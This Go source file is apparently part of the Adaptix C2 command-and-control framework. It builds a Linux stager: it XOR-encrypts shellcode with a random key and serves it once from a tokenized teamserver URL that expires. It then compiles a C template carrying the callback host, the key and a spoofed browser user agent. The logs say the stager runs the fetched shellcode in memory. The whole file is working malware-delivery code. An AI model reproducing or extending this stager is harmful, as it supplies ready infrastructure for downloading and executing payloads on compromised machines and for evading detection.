package main

import (
	crand "crypto/rand"
	"encoding/hex"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
)

// Productized Linux Stager (linux_agent).
// Shares file-backed /s/:token hosting semantics with beacon_agent.

const (
	linuxStagerTTL          = 24 * time.Hour
	linuxStagerCleanupEvery = 10 * time.Minute
)

var (
	linuxStagerInitOnce sync.Once
	linuxStagerInitErr  error

	linuxStagerHTTPEndpoint = func() string {
		if v := strings.TrimSpace(os.Getenv("ADAPTIX_ENDPOINT")); v != "" {
			if !strings.HasPrefix(v, "/") {
				v = "/" + v
			}
			return strings.TrimRight(v, "/")
		}
		return "/api"
	}()

	linuxStagerTSPort = func() int {
		if v := strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_PORT")); v != "" {
			if n, err := strconv.Atoi(v); err == nil && n > 0 {
				return n
			}
		}
		return 8080
	}()
)

func linuxStagerDir() string {
	candidates := []string{"data/stager", filepath.Join("dist", "data", "stager"), "/root/AdaptixC2/dist/data/stager"}
	for _, c := range candidates {
		if err := os.MkdirAll(c, 0700); err == nil {
			return c
		}
	}
	_ = os.MkdirAll("data/stager", 0700)
	return "data/stager"
}

func linuxStagerBlobPath(token string) string {
	tok := strings.Map(func(r rune) rune {
		if (r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F') {
			return r
		}
		return -1
	}, token)
	if tok == "" {
		return ""
	}
	return filepath.Join(linuxStagerDir(), tok+".bin")
}

func linuxStagerExtractToken(urlPath string) string {
	idx := strings.LastIndex(urlPath, "/s/")
	if idx < 0 {
		p := strings.Trim(urlPath, "/")
		if i := strings.LastIndex(p, "/"); i >= 0 {
			p = p[i+1:]
		}
		return p
	}
	tok := urlPath[idx+3:]
	if i := strings.IndexByte(tok, '/'); i >= 0 {
		tok = tok[:i]
	}
	return strings.TrimSpace(tok)
}

func linuxStagerCleanupExpired() {
	dir := linuxStagerDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	now := time.Now()
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".bin") {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		if now.Sub(info.ModTime()) > linuxStagerTTL {
			_ = os.Remove(filepath.Join(dir, e.Name()))
		}
	}
}

func linuxStagerServe(w http.ResponseWriter, r *http.Request) {
	tok := linuxStagerExtractToken(r.URL.Path)
	if tok == "" {
		http.NotFound(w, r)
		return
	}
	p := linuxStagerBlobPath(tok)
	if p == "" {
		http.NotFound(w, r)
		return
	}
	st, err := os.Stat(p)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	if time.Since(st.ModTime()) > linuxStagerTTL {
		_ = os.Remove(p)
		http.NotFound(w, r)
		return
	}
	data, err := os.ReadFile(p)
	if err != nil || len(data) == 0 {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Cache-Control", "no-store")
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	_, _ = w.Write(data)
	_ = os.Remove(p)
}

func linuxStagerInitRoutes() error {
	linuxStagerInitOnce.Do(func() {
		_ = os.MkdirAll(linuxStagerDir(), 0700)
		linuxStagerInitErr = Ts.TsEndpointRegisterPublicRaw("GET", "/s/:token", linuxStagerServe)
		if linuxStagerInitErr != nil {
			linuxStagerInitErr = Ts.TsEndpointRegisterPublicRaw("GET", "/s/*token", linuxStagerServe)
		}
		go func() {
			t := time.NewTicker(linuxStagerCleanupEvery)
			defer t.Stop()
			for range t.C {
				linuxStagerCleanupExpired()
			}
		}()
		linuxStagerCleanupExpired()
	})
	return linuxStagerInitErr
}

func linuxStagerRandomToken(n int) (string, error) {
	b := make([]byte, n)
	if _, err := crand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func linuxStagerRandomKey(n int) ([]byte, error) {
	b := make([]byte, n)
	if _, err := crand.Read(b); err != nil {
		return nil, err
	}
	return b, nil
}

func linuxStagerXor(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}

func linuxStagerKeyCLiteral(key []byte) string {
	parts := make([]string, len(key))
	for i, b := range key {
		parts[i] = fmt.Sprintf("0x%02x", b)
	}
	return strings.Join(parts, ",")
}

func linuxStagerPublish(token string, blob []byte) (string, error) {
	if err := linuxStagerInitRoutes(); err != nil {
		return "", err
	}
	p := linuxStagerBlobPath(token)
	if p == "" {
		return "", fmt.Errorf("invalid token")
	}
	if err := os.WriteFile(p, blob, 0600); err != nil {
		return "", err
	}
	return linuxStagerHTTPEndpoint + "/s/" + token, nil
}

func linuxStagerResolveHost(listenerMap map[string]any) (host string, port int, useSSL bool, err error) {
	host = "127.0.0.1"
	port = linuxStagerTSPort
	useSSL = true
	if lines, ok := listenerMap["callback_addresses"].([]interface{}); ok {
		for _, iLine := range lines {
			line, _ := iLine.(string)
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			h, _, e := net.SplitHostPort(line)
			if e != nil {
				host = line
			} else if h != "" {
				host = h
			}
			break
		}
	}
	if host == "" {
		return "", 0, false, fmt.Errorf("empty stager host")
	}
	return host, port, useSSL, nil
}

func linuxStagerFindTemplate(moduleDir string) (string, error) {
	for _, c := range []string{
		filepath.Join(moduleDir, "templates", "stager_linux.c"),
		filepath.Join(moduleDir, "stager_linux.c"),
	} {
		if st, err := os.Stat(c); err == nil && !st.IsDir() {
			return c, nil
		}
	}
	return "", fmt.Errorf("stager_linux.c not found under %s", moduleDir)
}

func buildLinuxStager(builderId string, moduleDir string, tempDir string, shellcode []byte, listenerMap map[string]any, arch string) ([]byte, string, error) {
	if len(shellcode) == 0 {
		return nil, "", fmt.Errorf("empty shellcode for linux stager")
	}

	host, port, useSSL, err := linuxStagerResolveHost(listenerMap)
	if err != nil {
		return nil, "", err
	}
	key, err := linuxStagerRandomKey(16)
	if err != nil {
		return nil, "", err
	}
	token, err := linuxStagerRandomToken(12)
	if err != nil {
		return nil, "", err
	}

	enc := linuxStagerXor(shellcode, key)
	absPath, err := linuxStagerPublish(token, enc)
	if err != nil {
		return nil, "", err
	}

	scheme, sslLit := "http", "0"
	if useSSL {
		scheme, sslLit = "https", "1"
	}
	fullURL := fmt.Sprintf("%s://%s:%d%s", scheme, host, port, absPath)
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Linux stager payload hosted: %s", fullURL))
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Linux stager policy: one-shot, TTL=%s", linuxStagerTTL))
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Linux stager exec: mmap+mprotect; inner shellcode=%d bytes arch=%s", len(shellcode), arch))

	tplPath, err := linuxStagerFindTemplate(moduleDir)
	if err != nil {
		return nil, "", err
	}
	tpl, err := os.ReadFile(tplPath)
	if err != nil {
		return nil, "", err
	}
	ua := "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
	src := string(tpl)
	src = strings.ReplaceAll(src, "@@STAGER_HOST@@", host)
	src = strings.ReplaceAll(src, "@@STAGER_PORT@@", strconv.Itoa(port))
	src = strings.ReplaceAll(src, "@@STAGER_PATH@@", absPath)
	src = strings.ReplaceAll(src, "@@STAGER_SSL@@", sslLit)
	src = strings.ReplaceAll(src, "@@STAGER_UA@@", ua)
	src = strings.ReplaceAll(src, "@@STAGER_KEY@@", linuxStagerKeyCLiteral(key))

	srcPath := filepath.Join(tempDir, "stager_linux_gen.c")
	outPath := filepath.Join(tempDir, "stager")
	if err := os.WriteFile(srcPath, []byte(src), 0600); err != nil {
		return nil, "", err
	}

	cc := "gcc"
	filename := "stager.x86_64"
	if arch == "ARM64" || arch == "aarch64" || arch == "arm64" {
		if _, err := os.Stat("/usr/bin/aarch64-linux-gnu-gcc"); err == nil {
			cc = "aarch64-linux-gnu-gcc"
		} else {
			return nil, "", fmt.Errorf("ARM64 stager requires aarch64-linux-gnu-gcc on teamserver")
		}
		filename = "stager.arm64"
	}

	args := []string{"-O2", "-s", "-o", outPath, srcPath, "-lssl", "-lcrypto"}
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Compiling Linux stager with %s ...", cc))
	if err := Ts.TsAgentBuildExecute(builderId, tempDir, cc, args...); err != nil {
		return nil, "", fmt.Errorf("linux stager compile failed: %w", err)
	}

	bin, err := os.ReadFile(outPath)
	if err != nil {
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("Linux stager ready: %d bytes; URL %s", len(bin), fullURL))
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("linux-stager-meta token=%s path=%s host=%s:%d ssl=%v ttl=%s built_at=%s",
		token, absPath, host, port, useSSL, linuxStagerTTL, time.Now().UTC().Format(time.RFC3339)))
	return bin, filename, nil
}
